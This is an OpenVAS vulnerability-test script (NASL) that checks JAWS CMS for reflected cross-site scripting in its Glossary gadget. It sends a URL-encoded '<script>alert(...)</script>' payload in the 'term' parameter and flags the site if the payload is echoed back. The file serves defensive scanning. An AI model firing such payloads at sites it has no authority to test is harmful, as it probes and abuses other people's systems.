###############################################################################
# OpenVAS Vulnerability Test
# $Id: jaws_xss.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# JAWS HTML injection vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19394");
  script_version("$Revision: 13679 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-1231", "CVE-2005-1800");
  script_bugtraq_id(13254, 13796);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("JAWS HTML injection vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://seclists.org/lists/fulldisclosure/2005/Apr/0416.html");
  script_xref(name:"URL", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-May/034354.html");

  script_tag(name:"solution", value:"Upgrade to JAWS 0.5.2 or later.");

  script_tag(name:"summary", value:"The remote version of JAWS does not perform a proper validation of
  user-supplied input to several variables used in the 'GlossaryModel.php' script, and is therefore
  vulnerable to cross-site scripting attacks.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
include("misc_func.inc");

vtstrings = get_vt_strings();

xss = "<script>alert('" + vtstrings["lowercase_rand"] + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode( str:xss );

exploits = make_list(
  string("gadget=Glossary&action=ViewTerm&term=", exss), # for 0.5.x
  string("gadget=Glossary&action=view&term=", exss) # for 0.4.x
);

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );
host = http_host_name( dont_add_port:TRUE );
if( http_get_has_generic_xss( port:port, host:host ) ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach exploit( exploits ) {

    url = string( dir, "/index.php?", exploit );

    req = http_get( item:url, port:port );
    res = http_keepalive_send_recv( port:port, data:req );

    if( res =~ "^HTTP/1\.[01] 200" && 'Term does not exists' >< res && xss >< res ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 0 );